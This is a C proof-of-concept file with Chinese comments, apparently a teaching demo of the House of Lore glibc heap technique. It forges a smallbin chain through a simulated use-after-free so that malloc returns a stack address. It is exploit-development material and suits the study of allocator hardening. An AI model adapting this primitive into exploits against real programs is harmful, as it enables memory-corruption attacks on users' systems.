/*
 * 手法：House of Lore，直接伪造 smallbin 双链，适用于 glibc 2.43，x86-64。
 *
 * 2.43 删除 fastbin，但 direct smallbin 链仍在；真正影响本 PoC 的变化是
 * 默认 tcache count 从 7 增为 16。必须准备 16 个填充块与至少 16 个可
 * stashing 的 fake 节点，否则 victim 会误入 tcache，或 fake 链尚未成为
 * tcache 头就被继续遍历。
 *
 * 成功判据严格为 `malloc(0x100) == 栈上 fake chunk user 地址`，不会用
 * 额外越界写篡改返回地址来伪造成功。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define REQUEST_SIZE 0x100
#define TCACHE_COUNT 16

struct fake_chunk {
    uint64_t prev_size;
    uint64_t size;
    uint64_t fd;
    uint64_t bk;
    unsigned char padding[0x100];
};

int main(void)
{
    setbuf(stdout, NULL);

    void *tcache_fill[TCACHE_COUNT];
    struct fake_chunk fake_first __attribute__((aligned(16)));
    struct fake_chunk fake_second __attribute__((aligned(16)));
    struct fake_chunk fake_chain[TCACHE_COUNT] __attribute__((aligned(16)));
    memset(&fake_first, 0, sizeof(fake_first));
    memset(&fake_second, 0, sizeof(fake_second));
    memset(fake_chain, 0, sizeof(fake_chain));

    uint64_t *victim = malloc(REQUEST_SIZE);
    assert(victim != NULL);
    for (int i = 0; i < TCACHE_COUNT; ++i) {
        tcache_fill[i] = malloc(REQUEST_SIZE);
        assert(tcache_fill[i] != NULL);
    }
    assert(malloc(0x500) != NULL);      /* guard，阻止 victim 与 top 合并。 */

    for (int i = 0; i < TCACHE_COUNT; ++i)
        free(tcache_fill[i]);
    free(victim);                       /* 第 17 个 free 才进入 unsorted。 */
    assert(malloc(0x600) != NULL);      /* 将 victim 排入 0x110 smallbin。 */

    fake_first.fd = (uint64_t)(victim - 2);
    fake_first.bk = (uint64_t)&fake_second;
    fake_second.fd = (uint64_t)&fake_first;
    fake_second.bk = (uint64_t)&fake_chain[0];
    for (int i = 0; i + 1 < TCACHE_COUNT; ++i)
        fake_chain[i].bk = (uint64_t)&fake_chain[i + 1];

    /* ---------------- 漏洞模拟：UAF 覆盖 smallbin victim->bk。 ---------------- */
    victim[1] = (uint64_t)&fake_first;

    for (int i = 0; i < TCACHE_COUNT; ++i)
        assert(malloc(REQUEST_SIZE) != NULL);

    void *real_result = malloc(REQUEST_SIZE);
    assert(real_result == victim);

    /* 16 个 stashed fake 节点 = first + second + chain[0..13]。 */
    void *expected = (char *)&fake_chain[TCACHE_COUNT - 3] + 0x10;
    void *fake_result = malloc(REQUEST_SIZE);

    assert(fake_result == expected);

    strcpy(fake_result, "LORE_243_STACK");
    assert(strcmp((char *)expected, "LORE_243_STACK") == 0);
    puts("[+] Lore 2.43：栈伪块命中");
    return 0;
}
